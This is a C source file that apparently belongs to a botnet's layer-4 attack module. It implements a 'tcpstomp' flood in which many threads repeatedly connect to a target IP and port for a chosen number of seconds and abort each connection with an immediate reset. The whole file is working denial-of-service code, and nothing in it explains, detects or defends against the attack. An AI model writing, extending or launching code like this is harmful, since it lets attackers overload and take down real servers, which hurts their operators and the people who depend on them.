#include "../../bot.h"
#include "l4.h"
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

void *tcpstomp_worker(void *arg) {
    target_t *t = arg;
    struct sockaddr_in addr;
    addr.sin_family = AF_INET; addr.sin_port = htons(t->port);
    inet_pton(AF_INET, t->ip, &addr.sin_addr);
    time_t end = time(NULL) + t->sec;
    while (time(NULL) < end && running) {
        int fd = socket(AF_INET, SOCK_STREAM, 0);
        if (fd < 0) continue;
        struct timeval tv = {2, 0};
        setsockopt(fd, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        int r1 = connect(fd, (struct sockaddr*)&addr, sizeof(addr));
        struct linger l = {1, 0};
        setsockopt(fd, SOL_SOCKET, SO_LINGER, &l, sizeof(l));
        close(fd);
        int fd2 = socket(AF_INET, SOCK_STREAM, 0);
        if (fd2 < 0) continue;
        setsockopt(fd2, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
        int r2 = connect(fd2, (struct sockaddr*)&addr, sizeof(addr));
        setsockopt(fd2, SOL_SOCKET, SO_LINGER, &l, sizeof(l));
        close(fd2);
        if (r1 < 0 && r2 < 0) sleep_ms(10);
    }
    return NULL;
}

void flood_tcpstomp(const char *target, int port, int sec) {
    target_t t; if (resolve_target(&t, target) < 0) return;
    t.port = port; t.sec = sec;
    int n = g_thread_count;
    pthread_t threads[n];
    for (int i = 0; i < n; i++)
        pthread_create(&threads[i], NULL, tcpstomp_worker, &t);
    for (int i = 0; i < n; i++)
        pthread_join(threads[i], NULL);
}
